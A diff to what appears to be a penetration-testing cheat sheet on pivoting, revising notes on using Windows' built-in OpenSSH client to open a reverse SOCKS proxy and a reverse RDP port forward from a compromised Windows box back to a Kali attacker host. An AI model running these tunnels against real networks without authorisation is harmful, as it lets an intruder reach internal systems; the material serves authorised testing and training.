@@ -33,11 +33,12 @@ chisel.exe client <KALI>:<PORT> R:3389:<IP>:3389
 ## Built-in Windows OpenSSH (no extra binary)
 Windows 10 1809+ / Server 2019+ ship an OpenSSH client at `C:\Windows\System32\OpenSSH\ssh.exe` — same flags as Linux `ssh`:
 ```cmd
-ssh.exe -R 1080 <USER>@<KALI>
-ssh.exe -D 1080 <USER>@<KALI>
+ssh.exe -N -R 1080 <USER>@<KALI>
+ssh.exe -N -R 127.0.0.1:3389:<IP>:3389 <USER>@<KALI>
 ```
-- `-R 1080`: remote port forward — opens `1080` on Kali, tunneled back to localhost on the Windows box (pair with `-N` to skip a remote shell if the account allows it).
-- `-D 1080`: dynamic SOCKS proxy *from* the Windows box's perspective — only useful if Kali has a reason to tunnel traffic back out through Windows, not the usual pivot direction. For routing Kali traffic into the Windows box's network, `-R` (to a listening SOCKS/relay on Kali) or chisel above is the right tool.
+- `-R 1080` with no destination = reverse SOCKS: Kali gets a SOCKS proxy on `127.0.0.1:1080` that exits from the Windows box into its network → proxychains `socks5 127.0.0.1 1080`. Needs OpenSSH client ≥ 7.6 (1809 ships 7.7).
+- Second line: one internal port on Kali loopback, like plink above.
+- `-D 1080` from Windows opens SOCKS on the Windows box that exits at Kali: wrong direction for a pivot.
 - `where ssh` / `Test-Path C:\Windows\System32\OpenSSH\ssh.exe` confirms it's actually present — older builds and Server Core may not have it.
 
 ## Proxychains
